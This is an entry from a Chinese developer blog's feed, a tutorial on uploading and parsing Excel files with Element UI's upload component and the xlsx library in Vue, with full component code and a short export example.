    <content type="html"><![CDATA[<p>vue 中使用 Element 的 upload 组件上传 Excel，大致可以分两种情况</p><ol><li>使用 <code>action</code> 上传到服务器</li><li>使用 <code>axios</code> 上传到服务器</li></ol><a id="more"></a><p><strong>注意：上传文件可能由于前后端格式不统一导致上传失败</strong></p><ul><li><code>application/x-www-form-urlencoded</code> 一般情况下使用这个比较多</li><li><code>multipart/form-data</code></li><li><code>application/json</code></li></ul><h2 id="使用-action"><a href="#使用-action" class="headerlink" title="使用 action"></a>使用 <code>action</code></h2><p>使用 <code>action</code> 时，首先会使用OPTIONS方法发起一个<strong>预检请求</strong>，从而获知服务器是否允许该跨域请求。服务器确认允许之后，才发起实际的 HTTP 请求。后端返回 204，以防处理 POST 请求时访问错误</p><p><img data-src="https://gitee.com/lilyn/pic/raw/master/company-img/upload_options.jpg"></p><p><strong>注意：使用 <code>action</code> ，需要后端做跨域处理。比如 Nginx <a href="https://juejin.cn/post/6844903782556368910">反向代理</a>、CORS 等</strong></p><p>效果如下：</p><p><img data-src="https://gitee.com/lilyn/pic/raw/master/js-img/%E4%B8%8A%E4%BC%A0xlsx.gif"></p><p>备注：</p><ol><li>如果希望使用 ajax 发送请求可以配置 <code>http-request</code></li><li>Window 电脑可以选择 <code>所有文件（*.*）</code> ，之后可以上传任意文件，最好在上传之前做个 <code>before-upload</code> 判断类型处理</li></ol><p>代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    &lt;el-upload</span><br><span class="line">      ref=&quot;upload&quot;</span><br><span class="line">      :accept=&quot;fileType.join(&#x27;,&#x27;)&quot;</span><br><span class="line">      :limit=&quot;1&quot;</span><br><span class="line">      :headers=&quot;upload.headers&quot;</span><br><span class="line">      :action=&quot;upload.url&quot;</span><br><span class="line">      :disabled=&quot;upload.isUploading&quot;</span><br><span class="line">      :before-upload=&quot;beforeUpload&quot;</span><br><span class="line">      :on-progress=&quot;handleFileProgress&quot;</span><br><span class="line">      :on-success=&quot;handleFileSuccess&quot;</span><br><span class="line">      :auto-upload=&quot;false&quot;</span><br><span class="line">      drag</span><br><span class="line">    &gt;</span><br><span class="line">      <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;el-icon-upload&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;el-upload__text&quot;</span>&gt;</span>将文件拖到此处，或<span class="tag">&lt;<span class="name">em</span>&gt;</span>点击上传<span class="tag">&lt;/<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">slot</span>=<span class="string">&quot;tip&quot;</span> <span class="attr">class</span>=<span class="string">&quot;el-upload__tip&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color: red&quot;</span>&gt;</span></span><br><span class="line">        提示：仅允许导入“xls”或“xlsx”格式文件！</span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-upload</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">&quot;success&quot;</span> <span class="attr">size</span>=<span class="string">&quot;mini&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;submitUpload&quot;</span>&gt;</span>上传到服务器<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">import</span> &#123; getToken &#125; <span class="keyword">from</span> <span class="string">&#x27;@/utils/auth&#x27;</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">  name: <span class="string">&#x27;Upload&#x27;</span>,</span></span><br><span class="line"><span class="javascript">  <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">      fileType: [<span class="string">&#x27;.xlsx&#x27;</span>, <span class="string">&#x27;.xls&#x27;</span>],</span></span><br><span class="line">      upload: &#123;</span><br><span class="line"><span class="javascript">        <span class="comment">// 设置上传的请求头部</span></span></span><br><span class="line">        headers: &#123; Authorization: getToken() &#125;,</span><br><span class="line"><span class="javascript">        <span class="comment">// 上传地址</span></span></span><br><span class="line"><span class="javascript">        url: <span class="string">&#x27;https://jsonplaceholder.typicode.com/posts/&#x27;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 是否更新已经存在的用户数据</span></span></span><br><span class="line"><span class="javascript">        isUploading: <span class="literal">false</span></span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line"><span class="javascript">    <span class="comment">// 文件上传中处理</span></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">handleFileProgress</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">this</span>.upload.isUploading = <span class="literal">true</span></span></span><br><span class="line">    &#125;,</span><br><span class="line"><span class="javascript">    <span class="comment">// 文件上传成功处理</span></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">handleFileSuccess</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">this</span>.upload.isUploading = <span class="literal">false</span></span></span><br><span class="line"><span class="javascript">      <span class="built_in">this</span>.$refs.upload.clearFiles()</span></span><br><span class="line">    &#125;,</span><br><span class="line"><span class="javascript">    <span class="comment">// 提交上传文件</span></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">submitUpload</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">this</span>.$refs.upload.submit()</span></span><br><span class="line">    &#125;,</span><br><span class="line"><span class="javascript">    <span class="comment">// 上传文件之前的钩子</span></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">beforeUpload</span>(<span class="params">file</span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> isXlsx = file.type === <span class="string">&#x27;application/vnd.ms-excel&#x27;</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (!isXlsx) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.$message.error(<span class="string">&#x27;上传文件只能是 xlsx 或 xls 格式&#x27;</span>)</span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> isXlsx</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="不使用-action"><a href="#不使用-action" class="headerlink" title="不使用 action"></a>不使用 <code>action</code></h2><p>上面需要后端配合使用，沟通起来还是比较麻烦的，还是推荐不使用 <code>action</code>，自己处理 ajax 请求可以更自由些</p><p>效果如下（数据是拿 mock 随机生成存入 Excel 的）：</p><p><img data-src="https://gitee.com/lilyn/pic/raw/master/company-img/%E5%AF%BC%E5%85%A5Excel.gif"></p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/FileReader">FileReader - MDN</a></p><ul><li>想把文件以断点续传的形式传给服务器，一般使用 <code>readAsArrayBuffer()</code> 读取文件</li><li>想把文件中的数据展示到页面上，一般使用 <code>readAsBinaryString()</code> 读取文件</li></ul><p><a href="https://element.eleme.cn/#/zh-CN/component/upload">Element Upload</a></p><ul><li><p><code>:on-change</code> 文件状态改变时的钩子，添加文件、上传成功和上传失败时都会被调用</p><p>第一个参数是 file，里面有文件内容、状态等信息</p><p><img data-src="https://gitee.com/lilyn/pic/raw/master/company-img/upload_file_raw.jpg"></p></li><li><p>把文件内容通过 FileReader 转换成二进制文件后</p><p>再通过 <code>xlsx.read</code> 读取，即可拿到 Excel 数据内容</p><p><img data-src="https://gitee.com/lilyn/pic/raw/master/company-img/upload_xlsx.jpg"></p></li><li><p>最后通过 <code>xlsx.utils.sheet_to_json</code> 即可转换成我们需要的数据格式</p></li></ul><p><a href="https://element.eleme.cn/#/zh-CN/component/loading">Element Loading</a></p><ul><li><p><code>Loading.service(options)</code> 以服务的方式调用的 Loading 需要异步关闭</p><p>需结合 <code>this.$nextTick()</code> 使用</p></li></ul><p>代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;uploadBox&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 上传文件按钮 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;buttonBox&quot;</span>&gt;</span></span><br><span class="line">      &lt;el-upload</span><br><span class="line">        action</span><br><span class="line">        accept=&quot;.xlsx,.xls&quot;</span><br><span class="line">        :show-file-list=&quot;false&quot;</span><br><span class="line">        :on-change=&quot;handleChange&quot;</span><br><span class="line">        :auto-upload=&quot;false&quot;</span><br><span class="line">      &gt;</span><br><span class="line">        <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">slot</span>=<span class="string">&quot;trigger&quot;</span> <span class="attr">type</span>=<span class="string">&quot;primary&quot;</span>&gt;</span>选取Excel文件<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">&quot;success&quot;</span> <span class="attr">:disabled</span>=<span class="string">&quot;disabled&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>提交到服务器<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-upload</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 解析出来的数据 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-show</span>=<span class="string">&quot;show&quot;</span> <span class="attr">class</span>=<span class="string">&quot;tableBox&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;el-icon-info&quot;</span>&gt;</span>请您检查无误后，再点击“提交到服务器”按钮<span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-table</span> <span class="attr">:data</span>=<span class="string">&quot;tempData&quot;</span> <span class="attr">border</span> <span class="attr">style</span>=<span class="string">&quot;width: 100%&quot;</span> <span class="attr">:height</span>=<span class="string">&quot;height&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;name&quot;</span> <span class="attr">label</span>=<span class="string">&quot;姓名&quot;</span> <span class="attr">min-width</span>=<span class="string">&quot;50%&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;phone&quot;</span> <span class="attr">label</span>=<span class="string">&quot;电话&quot;</span> <span class="attr">min-width</span>=<span class="string">&quot;50%&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">import</span> xlsx <span class="keyword">from</span> <span class="string">&#x27;xlsx&#x27;</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">import</span> &#123; Loading &#125; <span class="keyword">from</span> <span class="string">&#x27;element-ui&#x27;</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">import</span> uploadExcel <span class="keyword">from</span> <span class="string">&#x27;@/api&#x27;</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">  name: <span class="string">&#x27;Upload&#x27;</span>,</span></span><br><span class="line"><span class="javascript">  <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">      height: <span class="built_in">document</span>.documentElement.clientHeight - <span class="number">130</span>,</span></span><br><span class="line">      tempData: [],</span><br><span class="line"><span class="javascript">      show: <span class="literal">false</span>,</span></span><br><span class="line"><span class="javascript">      disabled: <span class="literal">false</span>,</span></span><br><span class="line">      character: &#123;</span><br><span class="line">        name: &#123;</span><br><span class="line"><span class="javascript">          text: <span class="string">&#x27;姓名&#x27;</span>,</span></span><br><span class="line"><span class="javascript">          type: <span class="string">&#x27;string&#x27;</span></span></span><br><span class="line">        &#125;,</span><br><span class="line">        phone: &#123;</span><br><span class="line"><span class="javascript">          text: <span class="string">&#x27;电话&#x27;</span>,</span></span><br><span class="line"><span class="javascript">          type: <span class="string">&#x27;string&#x27;</span></span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line"><span class="javascript">    <span class="comment">// 采集excel数据</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> <span class="function"><span class="title">handleChange</span>(<span class="params">file</span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> originData = file.raw</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (!originData) <span class="keyword">return</span></span></span><br><span class="line"><span class="javascript">      <span class="built_in">this</span>.show = <span class="literal">false</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> loadingInstance = Loading.service(&#123;</span></span><br><span class="line"><span class="javascript">        text: <span class="string">&#x27;努力加载中!!!&#x27;</span>,</span></span><br><span class="line"><span class="javascript">        background: <span class="string">&#x27;rgba(0, 0, 0, 0.8)&#x27;</span></span></span><br><span class="line">      &#125;)</span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> binaryData = <span class="keyword">await</span> <span class="built_in">this</span>.readFile(originData)</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> workbook = xlsx.read(binaryData, &#123; <span class="attr">type</span>: <span class="string">&#x27;binary&#x27;</span> &#125;)</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> worksheet = workbook.Sheets[workbook.SheetNames[<span class="number">0</span>]]</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> data = xlsx.utils.sheet_to_json(worksheet)</span></span><br><span class="line"><span class="javascript">      <span class="built_in">this</span>.tempData = <span class="built_in">this</span>.handleData(data)</span></span><br><span class="line"><span class="javascript">      <span class="keyword">await</span> <span class="built_in">this</span>.delay(<span class="number">300</span>)</span></span><br><span class="line"><span class="javascript">      <span class="built_in">this</span>.show = <span class="literal">true</span></span></span><br><span class="line">      loadingInstance.close()</span><br><span class="line">    &#125;,</span><br><span class="line"><span class="javascript">    <span class="comment">// 把读取出来的数据转换为服务器需要的格式</span></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">handleData</span>(<span class="params">data</span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> arr = []</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> char = <span class="built_in">this</span>.character</span></span><br><span class="line"><span class="javascript">      data.forEach(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> obj = &#123;&#125;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> char) &#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">if</span> (<span class="built_in">Object</span>.hasOwnProperty.call(char, key)) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> el = char[key]</span></span><br><span class="line"><span class="javascript">            <span class="keyword">let</span> val = item[el.text] || <span class="string">&#x27;&#x27;</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> type = el.type</span></span><br><span class="line"><span class="javascript">            type === <span class="string">&#x27;string&#x27;</span> ? (val = <span class="built_in">String</span>(val)) : <span class="literal">null</span></span></span><br><span class="line"><span class="javascript">            type === <span class="string">&#x27;number&#x27;</span> ? (val = <span class="built_in">Number</span>(val)) : <span class="literal">null</span></span></span><br><span class="line">            obj[key] = val</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        arr.push(obj)</span><br><span class="line">      &#125;)</span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> arr</span></span><br><span class="line">    &#125;,</span><br><span class="line"><span class="javascript">    <span class="comment">// 提交数据给服务器</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> <span class="function"><span class="title">submit</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (<span class="built_in">this</span>.tempData.length &lt;= <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.$message(&#123;</span></span><br><span class="line"><span class="javascript">          message: <span class="string">&#x27;请先选择Excel文件&#x27;</span>,</span></span><br><span class="line"><span class="javascript">          type: <span class="string">&#x27;warning&#x27;</span>,</span></span><br><span class="line"><span class="javascript">          showClose: <span class="literal">true</span></span></span><br><span class="line">        &#125;)</span><br><span class="line"><span class="javascript">        <span class="keyword">return</span></span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="javascript">      <span class="built_in">this</span>.disabled = <span class="literal">true</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> loadingInstance = Loading.service(&#123;</span></span><br><span class="line"><span class="javascript">        text: <span class="string">&#x27;努力加载中!!!&#x27;</span>,</span></span><br><span class="line"><span class="javascript">        background: <span class="string">&#x27;rgba(0, 0, 0, 0.8)&#x27;</span></span></span><br><span class="line">      &#125;)</span><br><span class="line"><span class="javascript">      <span class="keyword">await</span> <span class="built_in">this</span>.delay(<span class="number">300</span>)</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 发送API请求</span></span></span><br><span class="line"><span class="javascript">      uploadExcel(<span class="built_in">this</span>.tempData).then(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.$message(&#123;</span></span><br><span class="line"><span class="javascript">          message: <span class="string">&#x27;Excel文件已上传完毕&#x27;</span>,</span></span><br><span class="line"><span class="javascript">          type: <span class="string">&#x27;success&#x27;</span>,</span></span><br><span class="line"><span class="javascript">          showClose: <span class="literal">true</span></span></span><br><span class="line">        &#125;)</span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.show = <span class="literal">false</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.disabled = <span class="literal">false</span></span></span><br><span class="line">        loadingInstance.close()</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">readFile</span>(<span class="params">file</span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> reader = <span class="keyword">new</span> FileReader()</span></span><br><span class="line">        reader.readAsBinaryString(file)</span><br><span class="line"><span class="javascript">        reader.onload = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span></span><br><span class="line">          resolve(e.target.result)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">delay</span>(<span class="params">interval = <span class="number">0</span></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> timer = <span class="built_in">setTimeout</span>(<span class="function"><span class="params">_</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">          <span class="built_in">clearTimeout</span>(timer)</span></span><br><span class="line">          resolve()</span><br><span class="line">        &#125;, interval)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span></span><br><span class="line"><span class="css"><span class="selector-class">.buttonBox</span> &#123;</span></span><br><span class="line">  padding: 15px;</span><br><span class="line">  display: flex;</span><br><span class="line">&#125;</span><br><span class="line"><span class="css"><span class="selector-class">.el-button</span> &#123;</span></span><br><span class="line">  margin-right: 20px !important;</span><br><span class="line">&#125;</span><br><span class="line"><span class="css"><span class="selector-class">.tableBox</span> &#123;</span></span><br><span class="line">  padding: 0 15px;</span><br><span class="line">&#125;</span><br><span class="line">h3 &#123;</span><br><span class="line">  font-size: 18px;</span><br><span class="line"><span class="css">  <span class="selector-tag">color</span>: <span class="selector-id">#f56c6c</span>;</span></span><br><span class="line">  padding-bottom: 15px;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>导出数据</strong></p><p>如下方法使用 xlsx 导出，也可以使用 xlsx + file-saver 导出</p><ul><li><p><code>@selection-change</code> ，当选择项发生变化时会触发该事件</p><p>参数为 selection，拿到后处理一下</p></li><li><p>之后通过 <code>xlsx.utils.json_to_sheet</code> 将其变成 sheet</p><p>再新建一个表格 <code>xlsx.utils.book_new</code></p><p>往表格插入数据 <code>xlsx.utils.book_append_sheet</code></p><p>最后通过 <code>xlsx.writeFile</code> 即可下载</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = <span class="built_in">this</span>.selectionList.map(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    编号: item.id,</span><br><span class="line">    姓名: item.name,</span><br><span class="line">    电话: item.phone</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">const</span> sheet = xlsx.utils.json_to_sheet(arr)</span><br><span class="line"><span class="keyword">const</span> book = xlsx.utils.book_new()</span><br><span class="line">xlsx.utils.book_append_sheet(book, sheet, <span class="string">&#x27;表格名&#x27;</span>)</span><br><span class="line">xlsx.writeFile(book, <span class="string">`user<span class="subst">$&#123;<span class="keyword">new</span> <span class="built_in">Date</span>().getTime()&#125;</span>.xls`</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;vue 中使用 Element 的 upload 组件上传 Excel，大致可以分两种情况&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用 &lt;code&gt;action&lt;/code&gt; 上传到服务器&lt;/li&gt;
&lt;li&gt;使用 &lt;code&gt;axios&lt;/code&gt; 上传到服务器&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Vue" scheme="http://llmysnow.top/categories/Vue/"/>
    
    
    <category term="Vue" scheme="http://llmysnow.top/tags/Vue/"/>
    
    <category term="Element" scheme="http://llmysnow.top/tags/Element/"/>
    
    <category term="封装" scheme="http://llmysnow.top/tags/%E5%B0%81%E8%A3%85/"/>
    
  </entry>
  
  <entry>
    <title>Element tree树组件 鼠标双击事件</title>
    <link href="http://llmysnow.top/posts/e082dc34/"/>
